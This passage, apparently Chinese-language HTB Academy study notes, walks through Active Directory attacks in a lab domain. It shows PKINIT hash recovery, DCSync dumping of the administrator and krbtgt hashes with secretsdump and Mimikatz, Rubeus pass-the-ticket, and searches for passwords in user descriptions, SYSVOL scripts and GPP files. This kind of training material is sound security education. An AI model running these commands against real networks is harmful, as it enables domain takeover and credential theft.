<h4 id="使用-getnthash-py-为自己提交-TGS-请求"><a href="#使用-getnthash-py-为自己提交-TGS-请求" class="headerlink" title="使用 getnthash.py 为自己提交 TGS 请求"></a>使用 getnthash.py 为自己提交 TGS 请求</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$<br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>[*] Using TGT from cache<br>[*] Requesting ticket to self with PAC<br>Recovered NT Hash<br>313b6f423cd1ee07e91315b4919fb4ba<br></code></pre></td></tr></table></figure>

<h4 id="利用域控制器-NTLM-哈希进行-DCSync"><a href="#利用域控制器-NTLM-哈希进行-DCSync" class="headerlink" title="利用域控制器 NTLM 哈希进行 DCSync"></a>利用域控制器 NTLM 哈希进行 DCSync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator <span class="hljs-string">&quot;ACADEMY-EA-DC01$&quot;</span>@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba<br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::<br>[*] Kerberos keys grabbed<br>inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6<br>inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25<br>inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f<br>[*] Cleaning up...<br></code></pre></td></tr></table></figure>

<h4 id="请求-TGT-并使用-DC01-机器账户执行-PTT"><a href="#请求-TGT-并使用-DC01-机器账户执行-PTT" class="headerlink" title="请求 TGT 并使用 DC01$机器账户执行 PTT"></a>请求 TGT 并使用 DC01$机器账户执行 PTT</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Tools&gt; .\Rubeus.exe asktgt /user:ACADEMY<span class="hljs-literal">-EA-DC01</span><span class="hljs-variable">$</span> /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt<br><br>   ______        _<br>  (_____ \      | |<br>   _____) )_   _| |__  _____ _   _  ___<br>  |  __  /| | | |  _ \| ___ | | | |/___)<br>  | |  \ \| |_| | |_) ) ____| |_| |___ |<br>  |_|   |_|____/|____/|_____)____/(___/<br><br>  v2.<span class="hljs-number">0.2</span><br><br>[*] Action: Ask TGT<br><br>[*] <span class="hljs-keyword">Using</span> PKINIT with e<span class="hljs-keyword">type</span> rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br>[*] Building AS<span class="hljs-literal">-REQ</span> (w/ PKINIT preauth) <span class="hljs-keyword">for</span>: <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$&#x27;</span><br>[*] <span class="hljs-keyword">Using</span> domain controller: 172.16.5.5:88<br>[+] TGT request successful!<br><span class="hljs-function">[*] <span class="hljs-title">base64</span></span>(ticket.kirbi):<br> doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBUR....<br> <br>[+] Ticket successfully imported!<br><br>  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL<br>  ServiceRealm             :  INLANEFREIGHT.LOCAL<br>  UserName                 :  ACADEMY<span class="hljs-literal">-EA-DC01</span><span class="hljs-variable">$</span><br>  UserRealm                :  INLANEFREIGHT.LOCAL<br>  StartTime                :  <span class="hljs-number">3</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> PM<br>  EndTime                  :  <span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> AM<br>  RenewTill                :  <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">3</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> PM<br>  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable<br>  KeyType                  :  rc4_hmac<br>  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==<br>  ASREP (key)              :  <span class="hljs-number">2</span>A621F62C32241F38FA68826E95521DD<br></code></pre></td></tr></table></figure>

<h4 id="确认票据在内存中"><a href="#确认票据在内存中" class="headerlink" title="确认票据在内存中"></a>确认票据在内存中</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Tools&gt; klist<br><br>Current LogonId is <span class="hljs-number">0</span>:<span class="hljs-number">0</span>x4e56b<br><br>Cached Tickets: (<span class="hljs-number">3</span>)<br><br><span class="hljs-comment">#0&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span><br>        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> INLANEFREIGHT.LOCAL<br>        KerbTicket Encryption <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Ticket Flags <span class="hljs-number">0</span>x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize<br>        <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">3</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">53</span>:<span class="hljs-number">09</span> (local)<br>        <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Renew Time: <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Session Key <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Cache Flags: <span class="hljs-number">0</span>x2 -&gt; DELEGATION<br>        Kdc Called: ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br><br><span class="hljs-comment">#1&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span><br>        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="hljs-selector-tag">@</span> INLANEFREIGHT.LOCAL<br>        KerbTicket Encryption <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Ticket Flags <span class="hljs-number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize<br>        <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">3</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Renew Time: <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Session Key <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Cache Flags: <span class="hljs-number">0</span>x1 -&gt; PRIMARY<br>        Kdc Called:<br><br><span class="hljs-comment">#2&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span><br>        Server: cifs/academy<span class="hljs-literal">-ea-dc01</span> <span class="hljs-selector-tag">@</span> INLANEFREIGHT.LOCAL<br>        KerbTicket Encryption <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Ticket Flags <span class="hljs-number">0</span>x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize<br>        <span class="hljs-built_in">Start</span> Time: <span class="hljs-number">3</span>/<span class="hljs-number">30</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">53</span>:<span class="hljs-number">09</span> (local)<br>        <span class="hljs-keyword">End</span> Time:   <span class="hljs-number">3</span>/<span class="hljs-number">31</span>/<span class="hljs-number">2022</span> <span class="hljs-number">1</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Renew Time: <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">15</span>:<span class="hljs-number">50</span>:<span class="hljs-number">25</span> (local)<br>        Session Key <span class="hljs-built_in">Type</span>: RSADSI RC4<span class="hljs-literal">-HMAC</span>(NT)<br>        Cache Flags: <span class="hljs-number">0</span><br>        Kdc Called: ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br></code></pre></td></tr></table></figure>

<h4 id="使用-Mimikatz-执行-DCSync"><a href="#使用-Mimikatz-执行-DCSync" class="headerlink" title="使用 Mimikatz 执行 DCSync"></a>使用 Mimikatz 执行 DCSync</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\Tools&gt; <span class="hljs-built_in">cd</span> .\mimikatz\x64\<br><span class="hljs-built_in">PS</span> C:\Tools\mimikatz\x64&gt; .\mimikatz.exe<br><br>  .<span class="hljs-comment">#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53</span><br> .<span class="hljs-comment">## ^ ##.  &quot;A La Vie, A L&#x27;Amour&quot; - (oe.eo)</span><br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>       Vincent LE TOUX             ( vincent.letoux@gmail.com )<br>  <span class="hljs-string">&#x27;#####&#x27;</span>        &gt; https://pingcastle.com / https://mysmartlogon.com ***/<br><br>mimikatz <span class="hljs-comment"># lsadump::dcsync /user:inlanefreight\krbtgt</span><br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;INLANEFREIGHT.LOCAL&#x27;</span> will be the domain<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL&#x27;</span> will be the DC server<br>[<span class="hljs-type">DC</span>] <span class="hljs-string">&#x27;inlanefreight\krbtgt&#x27;</span> will be the user account<br>[<span class="hljs-type">rpc</span>] Service  : ldap<br>[<span class="hljs-type">rpc</span>] AuthnSvc : GSS_NEGOTIATE (<span class="hljs-number">9</span>)<br><br>Object RDN           : krbtgt<br><br>** SAM ACCOUNT **<br><br>SAM Username         : krbtgt<br>Account <span class="hljs-built_in">Type</span>         : <span class="hljs-number">30000000</span> ( USER_OBJECT )<br>User Account Control : <span class="hljs-number">00000202</span> ( ACCOUNTDISABLE NORMAL_ACCOUNT )<br>Account expiration   :<br>Password last change : <span class="hljs-number">10</span>/<span class="hljs-number">27</span>/<span class="hljs-number">2021</span> <span class="hljs-number">8</span>:<span class="hljs-number">14</span>:<span class="hljs-number">34</span> AM<br>Object Security ID   : S<span class="hljs-literal">-1-5-21-3842939050-3880317879-2865463114-502</span><br>Object Relative ID   : <span class="hljs-number">502</span><br><br>Credentials:<br>  Hash NTLM: <span class="hljs-number">16</span>e26ba33e455a8c338142af8d89ffbc<br>    ntlm- <span class="hljs-number">0</span>: <span class="hljs-number">16</span>e26ba33e455a8c338142af8d89ffbc<br>    lm  - <span class="hljs-number">0</span>: <span class="hljs-number">4562458</span>c201a97fa19365ce901513c21<br></code></pre></td></tr></table></figure>

<h2 id="杂项配置错误"><a href="#杂项配置错误" class="headerlink" title="杂项配置错误"></a>杂项配置错误</h2><h3 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h3><h4 id="枚举-MS-PRN-打印机漏洞"><a href="#枚举-MS-PRN-打印机漏洞" class="headerlink" title="枚举 MS-PRN 打印机漏洞"></a>枚举 MS-PRN 打印机漏洞</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Import-Module</span> .\SecurityAssessment.ps1<br><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-SpoolStatus</span> <span class="hljs-literal">-ComputerName</span> ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br><br>ComputerName                        Status<br><span class="hljs-literal">------------</span>                        <span class="hljs-literal">------</span><br>ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL   True<br></code></pre></td></tr></table></figure>

<h3 id="嗅探-LDAP-凭据"><a href="#嗅探-LDAP-凭据" class="headerlink" title="嗅探 LDAP 凭据"></a>嗅探 LDAP 凭据</h3><p>许多应用程序和打印机在其 Web 管理控制台中存储 LDAP 凭据以连接到域。这些控制台通常使用弱密码或默认密码。有时，这些凭据可以明文查看。其他时候，应用程序有一个 <code>test connection</code> 功能，我们可以通过将 LDAP IP 地址更改为我们的攻击主机，并在 LDAP 端口 389 上设置一个 <code>netcat</code> 监听器来收集凭据。当设备尝试测试 LDAP 连接时，它会将凭据发送到我们的机器，通常是明文形式。用于 LDAP 连接的账户通常具有特权，但即使没有，这也可以作为进入域的初始立足点。其他时候，需要一个完整的 LDAP 服务器来实施此攻击。</p>
<h3 id="枚举-DNS-记录"><a href="#枚举-DNS-记录" class="headerlink" title="枚举 DNS 记录"></a>枚举 DNS 记录</h3><p>我们可以使用诸如 adidnsdump 的工具，利用有效的域用户账户枚举域中的所有 DNS 记录。如果通过 <code>BloodHound</code> 等工具进行枚举时返回的主机命名约定与 <code>SRV01934.INLANEFREIGHT.LOCAL</code> 相似，这将特别有用。如果所有服务器和工作站都具有非描述性名称，我们将难以确定具体攻击目标。如果我们能够访问 AD 中的 DNS 条目，就有可能发现指向同一服务器的有趣 DNS 记录，例如 <code>JENKINS.INLANEFREIGHT.LOCAL</code> ，这有助于我们更好地规划攻击策略。</p>
<h4 id="使用-adidnsdump"><a href="#使用-adidnsdump" class="headerlink" title="使用 adidnsdump"></a>使用 adidnsdump</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 <br><br>Password: <br><br>[-] Connecting to host...<br>[-] Binding to host<br>[+] Bind OK<br>[-] Querying zone <span class="hljs-keyword">for</span> records<br>[+] Found 27 records<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">head</span> records.csv <br><br><span class="hljs-built_in">type</span>,name,value<br>?,LOGISTICS,?<br>AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691<br>AAAA,ForestDnsZones,dead:beef::231<br>A,ForestDnsZones,10.129.202.29<br>A,ForestDnsZones,172.16.5.240<br>A,ForestDnsZones,172.16.5.5<br>AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691<br>AAAA,DomainDnsZones,dead:beef::231<br>A,DomainDnsZones,10.129.202.29<br></code></pre></td></tr></table></figure>

<h4 id="使用-r-选项解析未知记录"><a href="#使用-r-选项解析未知记录" class="headerlink" title="使用 -r 选项解析未知记录"></a>使用 -r 选项解析未知记录</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r<br><br>Password: <br><br>[-] Connecting to host...<br>[-] Binding to host<br>[+] Bind OK<br>[-] Querying zone <span class="hljs-keyword">for</span> records<br>[+] Found 27 records<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">head</span> records.csv <br><br><span class="hljs-built_in">type</span>,name,value<br>A,LOGISTICS,172.16.5.240<br>AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691<br>AAAA,ForestDnsZones,dead:beef::231<br>A,ForestDnsZones,10.129.202.29<br>A,ForestDnsZones,172.16.5.240<br>A,ForestDnsZones,172.16.5.5<br>AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691<br>AAAA,DomainDnsZones,dead:beef::231<br>A,DomainDnsZones,10.129.202.29<br></code></pre></td></tr></table></figure>

<h3 id="其他配置错误"><a href="#其他配置错误" class="headerlink" title="其他配置错误"></a>其他配置错误</h3><h4 id="使用-Get-DomainUser-在描述字段中查找密码"><a href="#使用-Get-DomainUser-在描述字段中查找密码" class="headerlink" title="使用 Get-DomainUser 在描述字段中查找密码"></a>使用 Get-DomainUser 在描述字段中查找密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> * | <span class="hljs-built_in">Select-Object</span> samaccountname,description |<span class="hljs-built_in">Where-Object</span> &#123;<span class="hljs-variable">$_</span>.Description <span class="hljs-operator">-ne</span> <span class="hljs-variable">$null</span>&#125;<br><br>samaccountname description<br><span class="hljs-literal">--------------</span> <span class="hljs-literal">-----------</span><br>administrator  Built<span class="hljs-operator">-in</span> account <span class="hljs-keyword">for</span> administering the computer/domain<br>guest          Built<span class="hljs-operator">-in</span> account <span class="hljs-keyword">for</span> guest access to the computer/domain<br>krbtgt         Key Distribution Center Service Account<br>ldap.agent     *** <span class="hljs-keyword">DO</span> NOT CHANGE ***  <span class="hljs-number">3</span>/<span class="hljs-number">12</span>/<span class="hljs-number">2012</span>: Sunsh1ne4All!<br></code></pre></td></tr></table></figure>

<h4 id="使用-Get-DomainUser-检查-PASSWD-NOTREQD-设置"><a href="#使用-Get-DomainUser-检查-PASSWD-NOTREQD-设置" class="headerlink" title="使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置"></a>使用 Get-DomainUser 检查 PASSWD_NOTREQD 设置</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-UACFilter</span> PASSWD_NOTREQD | <span class="hljs-built_in">Select-Object</span> samaccountname,useraccountcontrol<br><br>samaccountname                                                         useraccountcontrol<br><span class="hljs-literal">--------------</span>                                                         <span class="hljs-literal">------------------</span><br>guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD<br>mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD<br>ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD<br><span class="hljs-variable">$725000</span><span class="hljs-literal">-9jb50uejje9f</span>                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT<br>nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT<br></code></pre></td></tr></table></figure>

<h4 id="发现一个有趣的脚本"><a href="#发现一个有趣的脚本" class="headerlink" title="发现一个有趣的脚本"></a>发现一个有趣的脚本</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">ls</span> \\academy<span class="hljs-literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts<br><br>    Directory: \\academy<span class="hljs-literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts<br><br><br>Mode                LastWriteTime         Length Name                                                                 <br><span class="hljs-literal">----</span>                <span class="hljs-literal">-------------</span>         <span class="hljs-literal">------</span> <span class="hljs-literal">----</span>                                                                 <br><span class="hljs-literal">-a----</span>       <span class="hljs-number">11</span>/<span class="hljs-number">18</span>/<span class="hljs-number">2021</span>  <span class="hljs-number">10</span>:<span class="hljs-number">44</span> AM            <span class="hljs-number">174</span> daily<span class="hljs-literal">-runs</span>.zip                                                       <br><span class="hljs-literal">-a----</span>        <span class="hljs-number">2</span>/<span class="hljs-number">28</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">11</span> PM            <span class="hljs-number">203</span> <span class="hljs-built_in">disable-nbtns</span>.ps1                                                    <br><span class="hljs-literal">-a----</span>         <span class="hljs-number">3</span>/<span class="hljs-number">7</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">9</span>:<span class="hljs-number">41</span> AM         <span class="hljs-number">144138</span> Logon Banner.htm                                                     <br><span class="hljs-literal">-a----</span>         <span class="hljs-number">3</span>/<span class="hljs-number">8</span>/<span class="hljs-number">2022</span>   <span class="hljs-number">2</span>:<span class="hljs-number">56</span> PM            <span class="hljs-number">979</span> reset_local_admin_pass.vbs  <br></code></pre></td></tr></table></figure>

<h4 id="在脚本中查找密码"><a href="#在脚本中查找密码" class="headerlink" title="在脚本中查找密码"></a>在脚本中查找密码</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; <span class="hljs-built_in">cat</span> \\academy<span class="hljs-literal">-ea-dc01</span>\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs<br><br>On Error Resume Next<br>strComputer = <span class="hljs-string">&quot;.&quot;</span><br> <br><span class="hljs-built_in">Set</span> oShell = CreateObject(<span class="hljs-string">&quot;WScript.Shell&quot;</span>) <br>sUser = <span class="hljs-string">&quot;Administrator&quot;</span><br>sPwd = <span class="hljs-string">&quot;!ILFREIGHT_L0cALADmin!&quot;</span><br> <br><span class="hljs-built_in">Set</span> Arg = WScript.Arguments<br><span class="hljs-keyword">If</span>  Arg.Count &gt; <span class="hljs-number">0</span> Then<br>sPwd = Arg(<span class="hljs-number">0</span>) <span class="hljs-string">&#x27;Pass the password as parameter to the script</span><br><span class="hljs-string">End if</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&#x27;</span>Get the administrator name<br><span class="hljs-built_in">Set</span> objWMIService = GetObject(<span class="hljs-string">&quot;winmgmts:\\&quot;</span> &amp; strComputer &amp; <span class="hljs-string">&quot;\root\cimv2&quot;</span>)<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h3 id="组策略首选项-GPP-密码"><a href="#组策略首选项-GPP-密码" class="headerlink" title="组策略首选项(GPP)密码"></a>组策略首选项(GPP)密码</h3><p>当创建新的 GPP 时，会在 SYSVOL 共享中生成一个.xml 文件，该文件也会缓存在应用组策略的终端本地。这些文件可用于：</p>
<ul>
<li>映射驱动器 (drives.xml)</li>
<li>创建本地用户</li>
<li>创建打印机配置文件（printers.xml）</li>
<li>创建和更新服务（services.xml）</li>
<li>创建计划任务 (scheduledtasks.xml)</li>
<li>更改本地管理员密码。</li>
</ul>
<p>这些文件可能包含各种配置数据和定义的密码。 <code>cpassword</code> 属性值采用 AES-256 位加密，但微软在 MSDN 上公布了 AES 私钥，可用于解密密码。任何域用户都可以读取这些文件，因为它们存储在 SYSVOL 共享中，默认情况下，域中的所有认证用户对该域控制器共享具有读取权限。</p>
